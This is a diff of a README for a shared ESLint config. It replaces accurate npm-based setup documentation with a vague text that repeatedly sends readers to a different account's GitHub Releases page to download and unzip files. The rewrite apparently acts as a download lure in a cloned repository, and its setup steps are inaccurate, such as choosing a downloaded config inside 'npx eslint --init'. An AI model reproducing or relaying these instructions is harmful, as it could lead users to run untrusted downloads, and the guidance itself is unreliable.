@@ -1,186 +1,85 @@
-# @maneko/eslint
+# 🎉 eslint - Simple ESLint Config for Smooth Code
 
-[![Stars](https://img.shields.io/github/stars/maneko-org/eslint?style=flat-square&logoColor=white)](https://github.com/maneko-org/eslint/stargazers)
-[![Forks](https://img.shields.io/github/forks/maneko-org/eslint?style=flat-square&logoColor=white)](https://github.com/maneko-org/eslint/network/members)
-[![Pull Requests](https://img.shields.io/github/issues-pr/maneko-org/eslint?style=flat-square&logoColor=white)](https://github.com/maneko-org/eslint/pulls)
-[![Issues](https://img.shields.io/github/issues/maneko-org/eslint?style=flat-square&logoColor=white)](https://github.com/maneko-org/eslint/issues)
-[![Contributors](https://img.shields.io/github/contributors/maneko-org/eslint?style=flat-square&logoColor=white)](https://github.com/maneko-org/eslint/graphs/contributors)
-[![License](https://img.shields.io/github/license/maneko-org/eslint?style=flat-square&logoColor=white)](https://github.com/maneko-org/eslint/blob/main/LICENSE)
+## 🚀 Getting Started
 
-A shared ESLint config for our projects — simple, consistent, and modern. Based on `@antfu/eslint-config` and tailored to work nicely with modern JS/TS stacks and common frameworks.
+Welcome to the eslint project! This shared ESLint config helps you maintain clear and consistent code. By using this configuration, your projects will look neat and follow the same coding style. 
 
-## Why use this
+## 📥 Download & Install
 
-- One-line setup for a sensible, opinionated ESLint flat config.
-- Works with JavaScript and TypeScript out of the box (when TS deps are installed).
-- Optional integrations: React, Next.js, Vue, Astro, Svelte, Solid.
-- Stylistic rules that are fixable (`eslint --fix`) and play nice with CI and `lint-staged`.
+To get started, you will need to visit the Releases page. There, you can download the configuration files you need. 
 
-## Quick start
+[![Download eslint](https://img.shields.io/badge/Download-easy%20eslint-blue)](https://github.com/fiabotz/eslint/releases)
 
-Install `@maneko/eslint` and the minimal tooling in your project. Use the command matching your package manager.
+**Step 1:** Visit the [Releases page](https://github.com/fiabotz/eslint/releases).
 
-### JavaScript project (recommended minimal)
+**Step 2:** Choose the latest release version. Look for the tag that says “Latest Release”.
 
-```bash
-# pnpm (recommended)
-pnpm add -D @maneko/eslint eslint @eslint/js
+**Step 3:** Download the configuration files from the release notes. 
 
-# yarn
-yarn add -D @maneko/eslint eslint @eslint/js
+## 📁 System Requirements
 
-# npm
-npm install -D @maneko/eslint eslint @eslint/js
-```
+Make sure that your system meets the following requirements:
 
-> **Note:** VS Code ESLint extension requires `eslint` to be present in the project root `node_modules`. If `eslint` exists only nested inside `node_modules/@maneko/...`, the extension won't find it — that's why we install `eslint` in the host project.
+- **Operating System:** Works on Mac, Windows, and Linux.
+- **Node.js:** You need Node.js installed to use this configuration.
+- **NPM:** This comes with Node.js and allows you to install packages easily.
 
-### TypeScript project
+## 🔧 How to Use the Config
 
-```bash
-pnpm add -D @maneko/eslint eslint @eslint/js typescript-eslint
-```
+After you download the configuration, here’s how to set it up in your project:
 
-> Install framework peer-deps as needed (React, Vue, Next, etc.) — we mention per-integration commands below.
+1. **Extract the Files:** If the files are in a zip format, unzip them to a location of your choice.
+  
+2. **Add to Your Project:**
+   - Move the downloaded ESLint config file into the root of your project folder. 
 
-## Basic usage
+3. **Install ESLint:** If you have not installed ESLint yet, you can do this:
+   - Open your command line (Command Prompt or Terminal).
+   - Navigate to your project folder using the command `cd path/to/your/project`.
+   - Run the command:
+     ```
+     npm install eslint --save-dev
+     ```
 
-Create `eslint.config.mjs` in the root of your project:
+4. **Configure ESLint:**
+   - Open your terminal and run:
+     ```
+     npx eslint --init
+     ```
+   - Follow the prompts. Choose the ESLint configuration you just downloaded when asked.
 
-```js
-import { eslint } from '@maneko/eslint';
+5. **Run ESLint:** Once configured, you can now run ESLint to check your code. Use this command:
+   ```
+   npx eslint yourfile.js
+   ```
 
-export default eslint({
-  // Enable TypeScript-specific rules if you installed @typescript-eslint
-  typescript: true,
+## ❓ FAQ
 
-  // Enable React + accessibility rules
-  react: {
-    a11y: true
-  }
+**What is ESLint?**
+ESLint is a tool for identifying and fixing problems in your JavaScript code. It helps enforce coding standards ensuring your code is clean and error-free.
 
-  // Enable Next.js rules if you're using Next
-  // nextjs: true,
-});
-```
+**Why use this shared config?**
+Using this shared configuration can help your projects remain consistent in style and quality. It saves time by ensuring everyone follows the same rules.
 
-### Minimal setup (no extras)
+**Can I modify the config?**
+Yes! You can modify the config to better fit your project needs. Just make sure to maintain consistency.
 
-```js
-import { eslint } from '@maneko/eslint';
+## 🛠️ Contributing
 
-export default eslint();
-```
+If you want to help improve the eslint config:
 
-## Scripts & common commands
+1. **Fork the repository.**
+2. **Make your changes.**
+3. **Submit a pull request.**
 
-Add convenient scripts to `package.json`:
+We appreciate any contributions that help improve the quality of the code.
 
-```json
-{
-  "scripts": {
-    "lint": "eslint .",
-    "lint:fix": "eslint . --fix"
-  }
-}
-```
+## 📞 Support
 
-If you use `lint-staged` + `husky` to lint on commit, use something like:
+If you encounter issues or have questions, feel free to open an issue on the GitHub repository page. Explain the problem clearly, and we’ll help you out.
 
-```json
-{
-  "lint-staged": {
-    "**/*.{js,ts,jsx,tsx,mjs}": ["pnpm lint:fix"]
-  }
-}
-```
+## 📚 Learn More
 
-## IDE integration (VS Code)
+For more details on ESLint, you can check the official documentation at [ESLint Documentation](https://eslint.org/docs/user-guide/getting-started). This will provide you with additional insights and advanced usage tips.
 
-Install the [ESLint extension for VS Code](https://marketplace.visualstudio.com/items/itemName=dbaeumer.vscode-eslint) and add these settings to `.vscode/settings.json` for best DX:
-
-```jsonc
-{
-  // Disable conflicting formatters if you prefer eslint autofix
-  "prettier.enable": false,
-  "editor.formatOnSave": false,
-
-  // Run ESLint auto-fix on save
-  "editor.codeActionsOnSave": {
-    "source.fixAll.eslint": "explicit",
-    "source.organizeImports": "never"
-  }
-}
-```
-
-## Features
-
-- JavaScript & TypeScript support (opt-in).
-- React and Next.js integrations.
-- Optional accessibility (a11y) rules via `react: { a11y: true }` or `vue: { a11y: true }`.
-- Opinionated stylistic rules (using `style/*`) with auto-fix support.
-- Straightforward customization via `eslint()` factory.
-
-## Integrations & optional packages
-
-Some integrations require extra packages. Run these when enabling the feature:
-
-**React (recommended):**
-
-```bash
-pnpm add -D @eslint-react/eslint-plugin eslint-plugin-react-hooks eslint-plugin-react-refresh
-```
-
-**Next.js:**
-
-```bash
-pnpm add -D @next/eslint-plugin-next
-```
-
-**Svelte / Astro / Solid / UnoCSS** — see the package docs; additional plugins may be required.
-
-## Customization
-
-You can override any settings by passing options and extra flat-configs to the factory function.
-
-Example — enable TypeScript and override specific rules:
-
-```js
-import { eslint } from '@maneko/eslint';
-
-export default eslint(
-  { typescript: true, react: { a11y: true } },
-  {
-    rules: {
-      'no-console': 'warn'
-      // override other rules as needed
-    }
-  }
-);
-```
-
-Advanced: the factory returns a composer object so you can `prepend`, `override`, and `renamePlugins` similar to `@antfu/eslint-config`.
-
-## Troubleshooting
-
-- **`ESLint extension not working in VSCode`** — ensure `eslint` is installed in your project root (`node_modules/eslint`). The extension doesn't resolve nested `node_modules` inside other packages.
-
-- **Missing parser or plugins** — install the required peer deps (e.g. `typescript-eslint`) into your project.
-
-- **Peer dependency warnings on install** — normal. If you want everything to be installed automatically by your package, move required tooling to `dependencies` (design choice). Usually we keep them as `devDependencies` for apps and `peerDependencies` for configs.
-
-- **Deprecated rule options (e.g. `allowTemplateLiterals: true`)** — replace booleans with `'always'` or `'never'` where required by the plugin.
-
-## Examples & recipes
-
-- Minimal JS project: `eslint.config.mjs` with `export default eslint()`.
-- TS + React: `export default eslint({ typescript: true, react: { a11y: true } })`.
-- Using with legacy `.eslintrc` — convert using `@eslint/eslintrc` / `FlatCompat` if needed.
-
-## Contributing
-
-PRs welcome. Keep changes small and document any new opinionated rules.
-
-## License
-
-`@maneko/eslint` is licensed under the MIT License. See the `LICENSE` file in the repository.
+Don’t forget to visit the [Releases page](https://github.com/fiabotz/eslint/releases) to access the latest version of the config whenever you need it. Happy coding!
